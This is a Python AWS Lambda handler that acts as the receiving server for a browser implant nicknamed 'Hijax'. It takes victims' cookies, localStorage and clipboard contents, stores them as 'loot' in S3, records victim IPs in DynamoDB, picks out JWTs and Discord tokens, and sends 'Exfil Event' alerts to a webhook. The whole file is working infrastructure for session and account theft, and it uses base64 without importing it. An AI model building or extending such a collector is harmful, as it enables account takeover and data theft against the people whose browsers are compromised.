import os
import json
import re
import boto3
import uuid
from datetime import datetime, timezone
from urllib import request as urlrequest

# Environment / config
S3_BUCKET = os.environ.get("HIJAX_S3_BUCKET")        # e.g. hijax-loot-prod
DDB_TABLE = os.environ.get("HIJAX_DDB_TABLE")       # e.g. hijax-events
WEBHOOK_URL = os.environ.get("HIJAX_ALERT_WEBHOOK") # optional

s3 = boto3.client("s3")
ddb = boto3.client("dynamodb")

# Heuristics
JWT_RE = re.compile(r"^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+$")
DISCORD_RE = re.compile(r"^(mfa\.[A-Za-z0-9_\-]{84}|[MN][A-Za-z0-9]{23}\.[\w-]{6}\.[\w-]{27})$")
LONG_TOKEN_RE = re.compile(r"^[A-Za-z0-9\-_\.=]{30,}$")

def redact_value(val: str, keep=6):
    if not isinstance(val, str):
        val = str(val)
    if len(val) <= keep * 2 + 4:
        return val
    return f"{val[:keep]}...{val[-keep:]}"

def flag_value(value):
    """Return list of heuristic flags for a single value"""
    flags = []
    if not isinstance(value, str):
        return flags
    if JWT_RE.match(value):
        flags.append("jwt")
    if DISCORD_RE.match(value):
        flags.append("discord_token")
    if LONG_TOKEN_RE.match(value):
        flags.append("long_token")
    return flags

def save_raw_to_s3(payload, key_prefix="raw"):
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    object_key = f"{key_prefix}/{ts}_{uuid.uuid4().hex}.json"
    s3.put_object(
        Bucket=S3_BUCKET,
        Key=object_key,
        Body=json.dumps(payload, default=str).encode("utf-8"),
        ServerSideEncryption="AES256"
    )
    return object_key

def save_summary_to_dynamo(summary):
    # summary is a dict; store as a simple item
    item = {
        "id": {"S": summary["id"]},
        "ts": {"S": summary["timestamp"]},
        "origin": {"S": summary.get("origin","unknown")},
        "domain": {"S": summary.get("domain","-")},
        "flags": {"S": ",".join(summary.get("flags", []))},
        "s3_key": {"S": summary["s3_key"]},
    }
    ddb.put_item(TableName=DDB_TABLE, Item=item)

def post_webhook(summary):
    if not WEBHOOK_URL:
        return
    try:
        payload = {
            "content": None,
            "embeds": [
                {
                    "title": "Hijax Exfil Event",
                    "fields": [
                        {"name": "Origin", "value": summary.get("origin","-"), "inline": True},
                        {"name": "Flags", "value": ",".join(summary.get("flags", [])) or "-", "inline": True},
                        {"name": "S3 Key", "value": summary.get("s3_key","-"), "inline": False},
                    ],
                    "timestamp": summary["timestamp"]
                }
            ]
        }
        req = urlrequest.Request(WEBHOOK_URL, data=json.dumps(payload).encode("utf-8"), headers={"Content-Type":"application/json"})
        urlrequest.urlopen(req, timeout=5)
    except Exception as e:
        # don't fail the main flow for webhook errors
        print("webhook error:", e)

def lambda_handler(event, context):
    """
    API Gateway proxy integration -> expects POST JSON payload
    Example event.body:
    {
      "origin": "implant", 
      "page": "https://.../payload.html", 
      "cookies": "a=1; b=2", 
      "localStorage": {...}, 
      "clipboard": "..."
    }
    """
    try:
        body_raw = event.get("body")
        if not body_raw:
            return {"statusCode":400, "body": json.dumps({"error":"empty body"})}

        if event.get("isBase64Encoded"):
            body_raw = base64.b64decode(body_raw).decode("utf-8")

        payload = json.loads(body_raw) if isinstance(body_raw, str) else body_raw

        # Basic metadata
        origin = payload.get("origin", payload.get("source", "implant"))
        page = payload.get("page", payload.get("url", "-"))
        client_ip = event.get("requestContext", {}).get("identity", {}).get("sourceIp") or event.get("headers", {}).get("X-Forwarded-For", "-")
        ts = datetime.now(timezone.utc).isoformat()

        # Save raw payload to S3
        raw_with_meta = {
            "timestamp": ts,
            "origin": origin,
            "page": page,
            "client_ip": client_ip,
            "payload": payload
        }
        s3_key = save_raw_to_s3(raw_with_meta, key_prefix="raw")

        # Build summary: scan cookie string / localStorage / clipboard for flags
        flags = set()
        domain = "-"
        # cookies may be a string like "a=1; b=2"
        cookies_str = payload.get("cookies") or ""
        if isinstance(cookies_str, dict):
            # some implants might send structured cookies
            cookie_values = []
            for v in cookies_str.values():
                cookie_values.append(str(v))
            cookies_all = " ".join(cookie_values)
        else:
            cookies_all = str(cookies_str)

        # check cookies and clipboard
        for token in re.split(r"[;,\s]\s*", cookies_all):
            f = flag_value(token)
            flags.update(f)
        clip = payload.get("clipboard") or ""
        for token in re.split(r"\s+", str(clip)):
            flags.update(flag_value(token))

        # localStorage values can be dict
        ls = payload.get("localStorage") or {}
        if isinstance(ls, dict):
            for k,v in ls.items():
                flags.update(flag_value(str(v)))

        summary = {
            "id": uuid.uuid4().hex,
            "timestamp": ts,
            "origin": origin,
            "page": page,
            "client_ip": client_ip,
            "flags": sorted(list(flags)),
            "s3_key": s3_key
        }

        # Save summary to DynamoDB
        save_summary_to_dynamo(summary)
        # send webhook if configured
        post_webhook(summary)

        return {
            "statusCode": 200,
            "body": json.dumps({"status":"ok","summary": {"id": summary["id"], "flags": summary["flags"], "s3_key": s3_key}})
        }

    except Exception as e:
        print("handler error:", e)
        return {"statusCode":500, "body": json.dumps({"error": str(e)})}
